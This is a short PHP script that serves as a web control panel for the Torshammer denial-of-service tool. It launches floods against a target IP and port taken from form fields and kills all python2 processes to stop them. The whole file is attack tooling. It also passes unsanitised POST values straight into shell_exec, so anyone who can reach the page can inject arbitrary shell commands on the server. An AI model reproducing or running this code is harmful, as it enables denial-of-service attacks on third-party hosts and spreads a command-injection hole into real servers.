<?php

  ini_set('display_errors', 1);
  ini_set('display_startup_errors', 1);
  error_reporting(E_ALL);
  // Use ls command to shell_exec
  // function
  $output = 'python2 scripts/Torshammer/torshammer.py -t'." ".$_POST['IP']." ".'-p'." ".$_POST['PORT']." ".'-r'." ".$_POST['RE'];

  if (isset($_POST['DDOS']))
  {
    print_r($output);
    shell_exec($output);
  }

   if(isset($_POST['DDOS-stop']))
     {
       shell_exec("kill -9 `pidof python2`");
        // shell_exec("ps -ef | grep python2 | grep -v grep | awk '{print $2}' | xargs kill");
     }
  //print_r($output);

?>
